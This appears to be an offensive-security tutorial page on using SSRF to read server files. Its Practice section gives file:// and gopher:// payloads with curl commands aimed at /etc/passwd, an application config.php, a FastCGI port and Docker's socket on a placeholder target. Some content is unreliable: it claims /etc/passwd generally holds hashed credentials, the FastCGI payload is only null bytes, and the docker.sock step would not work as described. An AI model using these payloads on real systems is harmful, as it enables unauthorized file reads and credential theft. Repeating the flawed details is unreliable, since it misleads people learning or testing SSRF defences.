---
title: SSRF File Access Exploitation Techniques
description: Learn how SSRF vulnerabilities enable unauthorized file access on servers.
  Explore exploitation techniques targeting sensitive files via SSRF.
keywords:
- SSRF
- File Access
- Exploitation
- Server Vulnerabilities
- Unauthorized File Read
- Local File Inclusion
- FastCGI
- Unix Socket
---

# File Access

## Context

The objective of this article is to demonstrate how Server-Side Request Forgery (SSRF) vulnerabilities can be exploited to access unauthorized files on target servers. This assumes a foundational understanding of file system permissions, web server configurations, HTTP request methods, and SSRF mechanisms.

## Theory

### File Protocols in SSRF Exploitation

The file:// protocol is a powerful SSRF vector allowing attackers direct access to files on a target server. By abusing SSRF vulnerabilities, attackers can employ the file:// scheme to instruct the server to read specific files. This poses a significant risk when web applications fail to restrict SSRF destinations strictly, making local files exposed to malicious requests.

### Targeting Sensitive Files

A common initial target for file access through SSRF is the /etc/passwd file on Unix systems. Successfully reading this file is a clear indicator of arbitrary file read capabilities. While the /etc/passwd file generally contains hashed user credentials, its access confirms the SSRF attack vector and can be crucial for user enumeration and further exploitation.

### Local File Inclusion via SSRF

Local File Inclusion (LFI) vulnerabilities occur when unsanitized user input is used in file path constructions within server-side code. By supplying specially crafted file:// URLs to SSRF vulnerable endpoints, attackers can manipulate backend server processes to execute unintended file reads with potentially devastating consequences.

### Advanced File Access Techniques

Advanced SSRF exploitation techniques can target FastCGI interfaces and Unix socket endpoints. The FastCGI protocol can expose file reading capabilities when SSRF payloads craft requests to interact with backend systems, potentially over gopher:// schemes. Unix domain sockets provide a bypass route, and SSRF can reach privileged operations by accessing these sockets, offering another layer of potentially devastating exploitation avenues.

## Practice

### Direct File Read via file:// Protocol

Using SSRF vulnerabilities, attackers can directly access files using the file:// protocol. This technique involves crafting payloads to trick the server into reading files.

- **Payload**: Use the following payload to access the Unix `/etc/passwd` file.
  
  ```text
  file:///etc/passwd
  ```

- **Command**: Deploy the payload using `curl` to send a POST request.
  
  ```bash
  curl -X POST 'https://target/app' -d 'url=file:///etc/passwd'
  ```

**Outcome**: This delivers unauthorized access to the contents of `/etc/passwd`, allowing the attacker to validate arbitrary file read capabilities.

### Arbitrary File Read via SSRF Parameter Manipulation

Leverage SSRF vulnerabilities to read arbitrary files that the server process can access.

- **Payload**: Target specific configuration files that might contain sensitive information.

  ```text
  file:///var/www/html/config.php
  ```

- **Command**: Execute using the following `curl` command.
  
  ```bash
  curl -X POST 'https://target/app' -d 'url=file:///var/www/html/config.php'
  ```

**Outcome**: Successfully accessing server-readable files could expose sensitive data, such as application configurations or credentials.

### File Read via FastCGI SSRF

Tamper with SSRF vectors to exploit FastCGI backend interfaces that handle file reads.

- **Payload**: Construct a gopher payload strategically for FastCGI data access.

  ```text
  gopher://127.0.0.1:9000/_%00%00%00%01%01%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
  ```

- **Command**: Pass this via `curl` to the vulnerable service.
  
  ```bash
  curl -X POST 'https://target/app' -d 'url=gopher://127.0.0.1:9000/_<payload>'
  ```

**Outcome**: Gain file content access via FastCGI by exploiting its response to SSRF queries.

### File Access via Unix Socket SSRF

Access Unix socket files using essential SSRF payloads, testing server socket interactions.

- **Payload**: Direct access to Docker's Unix socket file.

  ```text
  file:///var/run/docker.sock
  ```

- **Command**: Utilize `curl` to send payloads.

  ```bash
  curl -X POST 'https://target/app' -d 'url=file:///var/run/docker.sock'
  ```

**Outcome**: This interaction can facilitate further malicious activities by enabling communication with Unix socket-based APIs.

## Tools

- **curl**
- **Burp Suite**